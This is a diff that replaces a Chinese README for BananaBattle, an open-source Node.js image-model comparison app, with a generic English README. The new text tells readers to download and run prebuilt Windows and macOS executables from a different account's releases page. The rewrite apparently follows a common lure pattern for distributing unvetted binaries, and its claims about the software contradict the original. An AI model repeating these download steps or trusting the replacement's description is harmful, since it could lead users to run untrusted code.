@@ -1,87 +1,83 @@
-<div align="center">
+# 🍌 BananaBattle - Compare Models in One Click
 
+## 🚀 Getting Started
 
-<img width="1410" height="1584" alt="screenshot-20251122-163146" src="https://github.com/user-attachments/assets/5ba47fe6-dd1f-4cf9-86a0-7a90e8bed7ef" />
+Welcome to BananaBattle! This software allows you to easily compare new and old model performance using your data. Follow the steps below to download and run BananaBattle quickly.
 
+## 📥 Download BananaBattle
 
+[![Download BananaBattle](https://img.shields.io/badge/Download-BananaBattle-brightgreen)](https://github.com/desouzaals/BananaBattle/releases)
 
-# Banana Battle｜Nano Banana Pro 🆚 Nano Banana 丝滑对比
+Click the button above or visit the page below to download the latest version of BananaBattle.
 
+[Download BananaBattle from Releases](https://github.com/desouzaals/BananaBattle/releases)
 
+## 🖥️ System Requirements
 
-</div>
+Before you install BananaBattle, make sure your computer meets these requirements:
 
+- **Operating System:** Windows 10 or later, macOS Mojave or later
+- **Processor:** 2 GHz dual-core processor or better
+- **RAM:** At least 4 GB of RAM
+- **Disk Space:** Minimum of 1 GB free space
 
+## 📂 Download & Install
 
-https://github.com/user-attachments/assets/298f23e9-3b68-4496-ae65-04738ea75b6b
+1. **Visit the Releases Page:**
+   Go to the [Releases page](https://github.com/desouzaals/BananaBattle/releases).
 
+2. **Choose the Right File:**
+   You will see various files listed. Look for the file that matches your operating system. The files are usually named like this:
+   - `BananaBattle-windows-x64.zip` for Windows
+   - `BananaBattle-macOS.zip` for macOS
 
+3. **Download the File:**
+   Click on the appropriate file to start the download. Depending on your internet speed, this may take a few minutes.
 
-## 功能介绍
+4. **Extract Files (if needed):**
+   If you downloaded a ZIP file, you will need to extract it. Right-click on the downloaded file and choose “Extract All” or use your preferred extraction tool.
 
+5. **Run BananaBattle:**
+   Navigate to the folder where you extracted the files. Double-click on the `BananaBattle.exe` file (Windows) or `BananaBattle.app` (macOS) to start the application.
 
-✅在线免费 + 开源本地 + 在线部署
+6. **Follow the Setup Instructions:**
+   When you run the application for the first time, you may see a setup guide. Follow the on-screen instructions to configure the software according to your preferences.
 
-✅新老模型直观对比
+## ⚙️ How to Use BananaBattle
 
-✅一键生成对比图，包含所有信息，方便发社交媒体
+- **Data Input:**
+  Begin by uploading the model data you want to compare. You can typically drag and drop your files directly into the application or use the “Upload” button.
 
-✅自带提示词信息，方便大家分享
+- **Select Models:**
+  Choose the models you wish to compare. This can include both new and old versions of your models.
 
+- **Run the Comparison:**
+  Click the “Compare” button. Wait a few moments for the results to process. The application will display a side-by-side comparison of the selected models, highlighting key differences.
 
-### 生成的对比图可以直接发社交媒体！
+- **View Results:**
+  You can review the results directly within the application. Feel free to save or export these results if needed.
 
+## 📖 Features
 
-<img width="1600" height="1256" alt="BananaBattle_Report_1763798422349" src="https://github.com/user-attachments/assets/8136c652-fc58-467a-ad48-2b84eff023b4" />
+- **One-Click Comparisons:** Quickly compare models without complicated setups.
+- **User-Friendly Interface:** Designed for ease of use, so you don’t need programming skills to operate.
+- **Export Results:** Save your comparisons in various formats for easy sharing and review.
 
+## 🤔 Troubleshooting
 
-## Run and deploy your AI Studio app
+If you run into issues while using BananaBattle, consider the following tips:
 
-This contains everything you need to run your app locally.
+- **Check Requirements:** Ensure your system meets all the required specifications.
+- **Ensure Proper File Formats:** Make sure the data files you are trying to upload are in a supported format.
+- **Reinstall the Application:** If the software fails to run, reinstall it to fix potential corruption during download.
 
-View your app in AI Studio: https://ai.studio/apps/drive/167KRvaYYTgPXUcw7KsKOG3SgD93SbPVP
+## 🌟 Community Support
 
-## Run Locally
+For additional help, you can explore our community. Visit the **Issues** tab on the GitHub page or check out user forums for common questions and tips from other users.
 
-**Prerequisites:**  Node.js
+## 🔗 Useful Links
 
+- [BananaBattle Releases](https://github.com/desouzaals/BananaBattle/releases)
+- [GitHub Repository](https://github.com/desouzaals/BananaBattle)
 
-1. Install dependencies:
-   `npm install`
-2. Set the `GEMINI_API_KEY` in [.env.local](.env.local) to your Gemini API key
-3. Run the app:
-   `npm run dev`
-
-
-## 更新日志
-
-- 20251120
-  
-  创建项目
-  
-
-## Stars 
-
-[![Star History Chart](https://api.star-history.com/svg?repos=ZHO-ZHO-ZHO/BananaBattle&type=Date)](https://star-history.com/#ZHO-ZHO-ZHO/BananaBattle&Date)
-
-
-## 关于我 | About me
-
-📬 **联系我**：
-- 邮箱：zhozho3965@gmail.com
-  
-
-🔗 **社交媒体**：
-- 个人页：[-Zho-](https://jike.city/zho)
-- Bilibili：[我的B站主页](https://space.bilibili.com/484366804)
-- X（Twitter）：[我的Twitter](https://twitter.com/ZHO_ZHO_ZHO)
-- 小红书：[我的小红书主页](https://www.xiaohongshu.com/user/profile/63f11530000000001001e0c8?xhsshare=CopyLink&appuid=63f11530000000001001e0c8&apptime=1690528872)
-
-💡 **支持我**：
-- B站：[B站充电](https://space.bilibili.com/484366804)
-- 爱发电：[为我充电](https://afdian.com/a/ZHOZHO)
-
-
-## Credits
-
-[Gemini 3 Pro Image](https://gemini.google.com/app)
+Thank you for choosing BananaBattle! We hope you find it helpful in your modeling comparisons.
